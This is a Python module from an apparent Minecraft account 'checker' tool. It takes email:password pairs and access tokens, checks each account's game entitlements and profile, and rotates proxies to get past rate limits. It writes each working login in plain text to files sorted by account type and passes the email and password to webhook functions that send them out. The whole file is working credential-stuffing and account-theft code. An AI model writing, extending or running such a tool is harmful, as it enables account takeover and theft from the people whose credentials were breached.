"""
minecraft_checker.py — Minecraft entitlement detection and account type classification.
Uses /entitlements/license endpoint with checkownership() logic from DonutSMP Checker.py.
"""
import time
import requests


def checkownership(entitlements_response: dict) -> str | None:
    """
    Classify account type from the /entitlements/license response.
    Returns one of the six defined type strings, or None if no qualifying entitlement.
    """
    items = entitlements_response.get('items', [])
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    other_products = []

    for item in items:
        name = item.get('name', '')
        source = item.get('source', '')
        if name in ('game_minecraft', 'product_minecraft') and source in ('PURCHASE', 'MC_PURCHASE'):
            has_normal_minecraft = True
        elif name == 'product_game_pass_ultimate':
            has_game_pass_ultimate = True
        elif name == 'product_game_pass_pc':
            has_game_pass_pc = True
        elif name == 'product_minecraft_bedrock':
            other_products.append('Minecraft Bedrock')
        elif name == 'product_legends':
            other_products.append('Minecraft Legends')
        elif name == 'product_dungeons':
            other_products.append('Minecraft Dungeons')

    # Priority order: combined types first
    if has_normal_minecraft and has_game_pass_ultimate:
        return 'Normal Minecraft (with Game Pass Ultimate)'
    if has_normal_minecraft and has_game_pass_pc:
        return 'Normal Minecraft (with Game Pass)'
    if has_normal_minecraft:
        return 'Normal Minecraft'
    if has_game_pass_ultimate:
        return 'Xbox Game Pass Ultimate'
    if has_game_pass_pc:
        return 'Xbox Game Pass (PC)'
    if other_products:
        return f'Other: {", ".join(other_products)}'
    return None


def checkmc(
    session,
    email: str,
    password: str,
    token: str,
    xbox_token: str,
    config: dict,
    proxylist: list,
    maxretries: int,
    getproxy,
    stats_lock,
    fname: str,
    write_dedupe,
    capture_obj,
    send_xbox_webhook=None,
    send_other_webhook=None,
    engine=None,
) -> bool:
    """
    Check Minecraft entitlements and populate capture_obj with identity fields.
    Writes to appropriate result files. Returns True if account has any entitlement.
    """
    attempts = 0
    checkrq = None
    deadline = time.time() + 45

    while attempts < maxretries and time.time() < deadline:
        attempts += 1
        try:
            checkrq = session.get(
                'https://api.minecraftservices.com/entitlements/license',
                headers={'Authorization': f'Bearer {token}'},
                verify=False,
                timeout=15,
            )
            if checkrq.status_code == 429:
                if engine:
                    engine._report_rate_limit()
                session.proxies = getproxy()
                time.sleep(2 + attempts)
                continue
            break
        except Exception:
            session.proxies = getproxy()
            time.sleep(1 + attempts * 0.5)
            continue

    if checkrq is None or checkrq.status_code != 200:
        return False

    acctype = checkownership(checkrq.json())
    if acctype is None:
        return False

    # Fetch Minecraft profile (name, uuid, capes)
    name, uuid_str, capes_str = 'N/A', 'N/A', ''
    try:
        profilerq = session.get(
            'https://api.minecraftservices.com/minecraft/profile',
            headers={'Authorization': f'Bearer {token}'},
            timeout=10,
        )
        if profilerq.status_code == 200:
            p = profilerq.json()
            name = p.get('name', 'N/A')
            uuid_str = p.get('id', 'N/A')
            capes_str = ', '.join(c['alias'] for c in p.get('capes', []) if c.get('alias'))
    except Exception:
        pass

    # Populate CaptureObject identity fields
    capture_obj.name = name
    capture_obj.uuid = uuid_str
    capture_obj.capes = capes_str
    capture_obj.type = acctype

    # Write to type-specific files
    is_xgpu = 'Game Pass Ultimate' in acctype
    is_xgp = 'Game Pass (PC)' in acctype or ('Game Pass' in acctype and not is_xgpu)
    is_normal = 'Normal Minecraft' in acctype
    is_other = acctype.startswith('Other:')

    if is_xgpu:
        write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
        if send_xbox_webhook:
            try:
                send_xbox_webhook(email, password, acctype, config)
            except Exception:
                pass
    if is_xgp:
        write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
        if send_xbox_webhook:
            try:
                send_xbox_webhook(email, password, acctype, config)
            except Exception:
                pass
    if is_normal:
        write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
    if is_other:
        items_str = acctype.replace('Other: ', '')
        write_dedupe(fname, 'Other.txt', f'{email}:{password} | {items_str}\n')
        if send_other_webhook:
            try:
                send_other_webhook(email, password, items_str, config)
            except Exception:
                pass
        return True  # Other accounts don't get full capture processing

    return True
